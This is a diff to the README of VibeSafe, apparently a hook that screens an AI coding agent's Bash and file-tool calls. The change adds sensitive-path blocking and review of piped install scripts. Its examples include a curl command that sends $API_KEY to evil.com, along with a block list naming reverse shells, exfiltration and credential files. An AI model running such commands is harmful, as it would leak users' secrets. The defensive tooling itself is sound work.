@@ -80,11 +80,15 @@ Claude: Wants to run `npm install lodash`
 
 ### What Gets Checked
 
-VibeSafe **only checks Bash commands**. Other tools (Read, Write, Edit, etc.) pass through without checks.
+**File Tools (Write, Edit, Read):**
+- Sensitive path blocking (no LLM needed)
+- Write/Edit blocked: `~/.ssh/`, `~/.aws/`, `/etc/`, `~/.bashrc`, `CLAUDE.md`, etc.
+- Read blocked: SSH private keys, `.env`, AWS credentials, etc.
 
-For Bash commands:
-- **Instant Block**: Reverse shells, data exfiltration, crypto mining → Blocked immediately
-- **Trusted Domain**: github.com, bun.sh, npmjs.com, etc. → Allowed immediately
+**Bash Commands:**
+- **Instant Block**: Reverse shells, data exfiltration, crypto mining, destructive commands → Blocked immediately
+- **URL Shorteners**: bit.ly, tinyurl, t.co, etc. → Requires review (could redirect to malicious site)
+- **Trusted Domain**: github.com, bun.sh, npmjs.com, etc. → Allowed for downloads (not script execution)
 - **LLM Analysis** (requires API key): Unknown commands → Haiku triage → Sonnet review if needed
 
 ## 3-Stage Security Pipeline
@@ -170,10 +174,16 @@ Command: curl https://evil.com -d "$API_KEY"
 Result: ❌ DENIED - Potential secret exfiltration
 ```
 
-### Allowed (Trusted Domain)
+### Requires Review (Script Execution)
 ```
 Command: curl -fsSL https://bun.sh/install | bash
-Result: ✓ ALLOWED - Trusted domain (bun.sh)
+Result: ⚠️ REVIEW - Script execution requires LLM analysis (even from trusted domains)
+```
+
+### Allowed (Trusted Domain - Download Only)
+```
+Command: curl https://api.github.com/users/octocat
+Result: ✓ ALLOWED - Trusted domain (github.com), no script execution
 ```
 
 ### Allowed (Safe Package Install)
